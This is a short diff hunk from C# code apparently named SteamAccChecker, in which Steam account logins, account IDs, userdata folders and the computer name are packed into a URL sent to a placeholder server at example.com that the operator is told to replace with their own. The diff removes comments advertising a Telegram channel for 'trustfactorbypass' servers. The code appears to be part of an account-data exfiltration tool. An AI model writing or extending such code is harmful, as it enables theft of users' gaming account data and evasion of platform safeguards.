@@ -125,11 +125,9 @@ namespace SteamAccChecker
             string accountLoginsString = string.Join("\n", accountLogins);
             string userDataFoldersString = string.Join("\n", userDataFolders);
 			
-			// Вставьте вместо 'example.com' адрес вашего сервера
-			// Получить нативный веб сервер можно тут: https://t.me/trustfactorbypass
+			// Вставьте вместо 'example.com' адрес вашего сервера.
 			
 			// Insert instead of 'example.com' your server address
-			// You can get a native web server here: https://t.me/trustfactorbypass
 			
             string url = $"http://example.com/api.php?computername={computerName}&perm_account_id={permAccountIdsString}&acc_login={accountLoginsString}&acc_ids={userDataFoldersString}&license_key={unique_key}";
 
